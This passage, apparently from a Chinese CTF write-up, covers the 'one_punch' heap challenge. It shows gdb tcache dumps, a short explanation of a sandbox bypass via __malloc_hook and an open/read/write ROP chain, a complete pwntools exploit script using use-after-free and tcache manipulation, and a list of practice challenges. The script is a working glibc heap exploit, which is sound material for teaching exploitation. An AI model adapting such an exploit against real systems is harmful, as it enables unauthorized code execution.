(0x130)   tcache_entry[17](7): 0x555555559980 --> 0x555555559850 --> 0x555555559720 --> 0x5555555595f0 --> 0x5555555594c0 --> 0x555555559390 --> 0x555555559260
(0x210)   tcache_entry[31](144): 0
(0x220)   tcache_entry[32](77): 0x55555555d7c0 --> 0x7ffff7fb4c30
(0x230)   tcache_entry[33](251): 0
(0x240)   tcache_entry[34](247): 0
(0x250)   tcache_entry[35](255): 0
(0x260)   tcache_entry[36](127): 0
(0x410)   tcache_entry[63](7): 0x55555555bd50 --> 0x55555555b940 --> 0x55555555b530 --> 0x55555555b120 --> 0x55555555ad10 --> 0x55555555a900 --> 0x55555555a4f0
gdb-peda$ x/4gx 0x000055555555901f+0x10
0x55555555902f: 0x00007ffff7fb4d90      0x0000000000000000
0x55555555903f: 0x0000000000000000      0x0000000000000000
```
由于沙箱保护，我们无法执行 `execve` 函数调用，只能通过 `open/read/write` 来读取 flag 。我们选择通过调用后门函数修改 `__malloc_hook` 为 `gadget(mov eax, esi ; add rsp, 0x48 ; ret)` ，以便 add 的时候将 `rsp` 改到可控的输入区域调用 `rop chains` 来 `orw` 读取 `flag` 。

完整 exp 如下：

```python
#coding=utf-8
from pwn import *
context.update(arch='amd64',os='linux',log_level='DEBUG')
context.terminal = ['tmux','split','-h']
debug = 1
elf = ELF('./one_punch')
libc_offset = 0x3c4b20
gadgets = [0x45216,0x4526a,0xf02a4,0xf1147]
if debug:
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    p = process('./one_punch')

def Add(idx,name):
    p.recvuntil('> ')
    p.sendline('1')
    p.recvuntil("idx: ")
    p.sendline(str(idx))
    p.recvuntil("hero name: ")
    p.send(name)


def Edit(idx,name):
    p.recvuntil('> ')
    p.sendline('2')
    p.recvuntil("idx: ")
    p.sendline(str(idx))
    p.recvuntil("hero name: ")
    p.send(name)

def Show(idx):
    p.recvuntil('> ')
    p.sendline('3')
    p.recvuntil("idx: ")
    p.sendline(str(idx))

def Delete(idx):
    p.recvuntil('> ')
    p.sendline('4')
    p.recvuntil("idx: ")
    p.sendline(str(idx))

def BackDoor(buf):
    p.recvuntil('> ')
    p.sendline('50056')
    sleep(0.1)
    p.send(buf)

def exp():
    #leak heap
    for i in range(7):
        Add(0,'a'*0x120)
        Delete(0)
    Show(0)
    p.recvuntil("hero name: ")
    heap_base = u64(p.recvline().strip('\n').ljust(8,'\x00')) - 0x850
    log.success("[+]heap base => "+ hex(heap_base))
    #leak libc
    Add(0,'a'*0x120)
    Add(1,'a'*0x400)
    Delete(0)
    Show(0)
    p.recvuntil("hero name: ")
    libc_base = u64(p.recvline().strip('\n').ljust(8,'\x00')) - (0x902ca0-0x71e000)
    log.success("[+]libc base => " + hex(libc_base))
    #
    for i in range(6):
        Add(0,'a'*0xf0)
        Delete(0)
    for i in range(7):
        Add(0,'a'*0x400)
        Delete(0)
    Add(0,'a'*0x400)
    Add(1,'a'*0x400)
    Add(1,'a'*0x400)
    Add(2,'a'*0x400)
    Delete(0)#UAF
    Add(2,'a'*0x300)
    Add(2,'a'*0x300)
    #agagin
    Delete(1)#UAF
    Add(2,'a'*0x300)
    Add(2,'a'*0x300)
    Edit(2,'./flag'.ljust(8,'\x00'))
    Edit(1,'a'*0x300+p64(0)+p64(0x101)+p64(heap_base+(0x000055555555c460-0x555555559000))+p64(heap_base+0x1f))

    #trigger
    Add(0,'a'*0x217)

    Delete(0)
    Edit(0,p64(libc_base+libc.sym['__malloc_hook']))
    #gdb.attach(p,'b calloc')
    Add(0,'a'*0xf0)

    BackDoor('a')
    #mov eax, esi ; add rsp, 0x48 ; ret
    #magic_gadget = libc_base + libc.sym['setcontext']+53
    # add rsp, 0x48 ; ret
    magic_gadget = libc_base + 0x000000000008cfd6
    payload = p64(magic_gadget)

    BackDoor(payload)

    p_rdi = libc_base + 0x0000000000026542
    p_rsi = libc_base + 0x0000000000026f9e
    p_rdx = libc_base + 0x000000000012bda6
    p_rax = libc_base + 0x0000000000047cf8
    syscall = libc_base + 0x00000000000cf6c5
    rop_heap = heap_base + 0x44b0

    rops = p64(p_rdi)+p64(rop_heap)
    rops += p64(p_rsi)+p64(0)
    rops += p64(p_rdx)+p64(0)
    rops += p64(p_rax)+p64(2)
    rops += p64(syscall)
    #rops += p64(libc.sym['open'])
    #read
    rops += p64(p_rdi)+p64(3)
    rops += p64(p_rsi)+p64(heap_base+0x260)
    rops += p64(p_rdx)+p64(0x70)
    rops += p64(p_rax)+p64(0)
    rops += p64(syscall)
    #rops += p64(libc.sym['read'])
    #write
    rops += p64(p_rdi)+p64(1)
    rops += p64(p_rsi)+p64(heap_base+0x260)
    rops += p64(p_rdx)+p64(0x70)
    rops += p64(p_rax)+p64(1)
    rops += p64(syscall)
    Add(0,rops)
    p.interactive('$ xmzyshypnc')

exp()
```

### 0x06 建议习题：

* 2018 HITCON children_tcache
* 2018 BCTF houseOfAtum
* 2019 HTICON Lazy House
* 2020 XCTF no-Cov twochunk
